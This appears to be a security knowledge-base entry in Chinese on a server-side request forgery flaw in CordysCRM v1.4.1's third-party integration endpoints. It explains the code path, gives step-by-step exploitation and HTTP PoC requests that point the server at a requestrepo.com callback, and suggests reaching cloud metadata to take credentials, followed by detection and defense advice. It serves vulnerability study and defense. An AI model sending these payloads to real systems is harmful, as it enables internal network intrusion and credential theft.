---
id: web-generic-ssrf-cordyscrm-thirdparty-integration-url
title: CordysCRM 第三方集成测试/编辑接口 URL 未校验：MAXKB 与 DataEase 配置分支均可触发服务端 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: integration-config-url-ssrf
aliases:
- CordysCRM SSRF
- 第三方集成 SSRF
- MAXKB 地址 SSRF
- DataEase 配置 SSRF
- mkAddress SSRF
- redirectUrl SSRF
tags:
- ssrf
- java
- spring
- resttemplate
- integration
- maxkb
- dataease
- cordyscrm
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: v1.4.1（原文测试版本，作者称最新版已修复）
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T08:59:34+08:00'
  notes: 已对照原文与图22-45核对：/third-party/test 与 /third-party/edit 均进入 getToken，MAXKB 分支 getMaxKBToken 用 urlTransfer(mkAddress)+APPLICATION 走 QrCodeClient.exchange→RestTemplate GET；DE 分支 pingDeUrl(redirectUrl)+DataEaseClient.validate→get(user/personInfo)；原文 requestrepo 记录到 GET /admin/api/worksp... 与 edit 返回 200 及 DNS 请求，与图29-33/44-45一致。未验证点：两接口分别需 SYSTEM_SETTING_READ/UPDATE 权限及有效 X-AUTH-TOKEN/CSRF-TOKEN；内网元数据利用未在原文验证；PoC 未本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

CordysCRM v1.4.1 的第三方集成配置把 `mkAddress`（MAXKB 地址）、`redirectUrl`（DataEase 地址）等字段直接交给 `RestTemplate.exchange` 发起 GET 请求，未做协议/域名白名单与内网地址过滤；拥有系统设置权限的用户通过 `POST /third-party/test` 或 `POST /third-party/edit` 即可让服务器访问任意内网地址或云元数据，形成 SSRF。

## 原理

- 入口一：`POST /third-party/test`，`@RequiresPermissions(SYSTEM_SETTING_READ)`，方法 `validate(@RequestBody ThirdConfigurationDTO)` → `integrationConfigService.testConnection(configDTO)`。
- 入口二：`POST /third-party/edit`，`@RequiresPermissions(SYSTEM_SETTING_UPDATE)` → `integrationConfigService.editThirdConfig(configDTO, ...)`；两者最终都调用 `getToken(configDTO)`。
- `getToken(ThirdConfigurationDTO)` 按 `configDTO.getType()` 分支：
  - `MAXKB`：`tokenService.getMaxKBToken(configDTO.getMkAddress(), configDTO.getAppSecret())`。该方法把 `HttpRequestUtil.urlTransfer(mkAddress).concat(MaxKBAPiPaths.APPLICATION)` 作为 URL，调用 `qrCodeClient.exchange(url, "Bearer " + apiKey, ...)`；`QrCodeClient.exchange` 内部执行 `restTemplate.exchange(url, HttpMethod.GET, request, Object.class)`，URL 完全来自 `mkAddress`。
  - `DE`：`validDeConfig(configDTO)`，先 `tokenService.pingDeUrl(configDTO.getRedirectUrl())`，再 `new DataEaseClient(configDTO)`；`DataEaseClient` 构造器把 `endpoint` 设为 `cfg.getRedirectUrl()`，`validate()` 调用 `get("user/personInfo")` → `getUrl(path)` 返回 `endpoint + "/de2api/" + path` → 同样走 `RestTemplate.exchange` GET。
  - 其他分支（WECOM/DINGTALK/LARK/SQLBOT/TENDER）也各自向配置中的地址发起请求，属于同类面。
- 根因：集成配置的地址字段由请求体完全控制，`ThirdConfigurationDTO` 只有字段定义，没有 `@URL` 白名单、协议限制或内网 IP 校验；出站请求使用通用 `RestTemplate`，默认允许访问任意主机/端口，且会把响应/错误信息返回给调用方（错误回显可辅助探测内网端口）。
- 原文 PoC 中服务器把请求发到了 `requestrepo.com` 的子域名，DNS 侧记录到请求，证明 SSRF 可达；即使业务响应为 500/报错，出站请求已经发生。

## 触发条件

- 目标为 CordysCRM v1.4.1（原文测试版本，作者称最新版已修复）。
- 攻击者拥有可访问第三方集成接口的账号：`/third-party/test` 需要 `SYSTEM_SETTING_READ`，`/third-party/edit` 需要 `SYSTEM_SETTING_UPDATE`（通常为管理员/系统设置角色）。
- 请求需携带有效 `X-AUTH-TOKEN` 与 `CSRF-TOKEN`。
- 应用服务器可出站访问目标地址（内网、云元数据或攻击者控制的 HTTP 服务）。
- 目标分支要求的其他字段非空：`testConnection` 会先校验 `appSecret`；`DE` 分支要进入 `DataEaseClient.validate()` 需 `deAccessKey`、`deSecretKey`、`redirectUrl` 均非空，但 `pingDeUrl(redirectUrl)` 在此之前已发起请求。

## 利用步骤

1. 登录 CordysCRM，获取 `X-AUTH-TOKEN` 与 `CSRF-TOKEN`。
2. 选 MAXKB 分支：向 `POST /third-party/test` 发送 `{"type":"MAXKB","mkAddress":"http://<攻击者域名>","appSecret":"123456789"}`；或用 `POST /third-party/edit` 发送同样配置。
3. 在攻击者 HTTP/DNS 日志中观察是否收到来自目标服务器的请求；原文使用 requestrepo 子域名，看到 `GET /admin/api/workspace/...` 一类请求。
4. 选 DataEase 分支：向 `POST /third-party/edit` 发送 `{"type":"DE","redirectUrl":"http://<攻击者域名>","deAccessKey":"Aa12312133","deSecretKey":"123456"}`，观察目标是否请求 `http://<攻击者域名>/de2api/user/personInfo`。
5. 改为内网地址（`http://127.0.0.1:<port>/`、内网网段、`169.254.169.254` 等）探测；利用错误信息/响应差异判断端口与服务。
6. 确认可达后停止；避免对元数据服务做凭证窃取以外的破坏性操作。

## PoC

MAXKB 分支（原文 PoC）：

```http
POST /third-party/test HTTP/1.1
Host: target:8081
Content-Type: application/json;charset=UTF-8
X-AUTH-TOKEN: <登录后下发>
CSRF-TOKEN: <登录后下发>

{"type":"MAXKB","mkAddress":"http://at5o8p0c.requestrepo.com","appSecret":"123456789"}
```

服务端实际发起（示意）：

```http
GET /admin/api/workspace/... HTTP/1.1
Host: at5o8p0c.requestrepo.com
Authorization: Bearer 123456789
```

DataEase 分支（原文 PoC）：

```http
POST /third-party/edit HTTP/1.1
Host: target:8081
Content-Type: application/json;charset=UTF-8
X-AUTH-TOKEN: <登录后下发>
CSRF-TOKEN: <登录后下发>

{"type":"DE","redirectUrl":"http://at5o8p0c.requestrepo.com","deAccessKey":"Aa12312133","deSecretKey":"123456"}
```

目标随后请求 `http://at5o8p0c.requestrepo.com/de2api/user/personInfo`；原文截图显示 `/third-party/edit` 返回 200，requestrepo 记录到请求。

## 变体与关联

- 变体：`WECOM`、`DINGTALK`、`LARK`、`SQLBOT`、`TENDER` 分支同样把配置中的地址/密钥交给下游客户端请求，可逐个测试出站。
- 变体：`testConnection` 的 `appSecret` 非空校验只拦空值，不拦 URL；`editThirdConfig` 路径可能绕过 test 的校验顺序。
- 变体：若目标部署在云上，可将 `mkAddress/redirectUrl` 指向 `169.254.169.254` 等元数据地址，进一步窃取临时凭证（需目标网络可达）。
- 关联：[[web-generic-ssrf-avatar-urlopen-internal-service]]（用户可控 URL 直接出站抓取的同类根因）。
- 关联：[[web-generic-ssrf-cloud-metadata]]（SSRF 读取云元数据获取临时凭证）。
- 关联：[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（配置/参数 URL 只做弱校验导致 SSRF）。

## 检测与防御

- 防御：集成地址必须做协议白名单（仅 http/https）与主机白名单/内网地址拒绝（解析后校验 IP，含 IPv6、十进制/八进制等变体）；出站请求固定解析结果，防 DNS rebinding。
- 防御：对第三方集成地址使用独立出站代理/网络策略，禁止访问回环、链路本地、私有网段与云元数据地址。
- 防御：不要把底层 `RestTemplate` 异常原文返回给前端；错误信息只记录服务端日志。
- 检测：审计 `restTemplate.exchange` 的 URL 来源，追踪 `mkAddress`、`redirectUrl` 等配置字段是否经过校验。
- 检测：系统设置接口出现指向外部域名/内网 IP 的集成地址；同一账号短时间内多次修改集成配置并触发 test/edit；出站 DNS 请求中出现随机子域名（requestrepo、dnslog 等）。
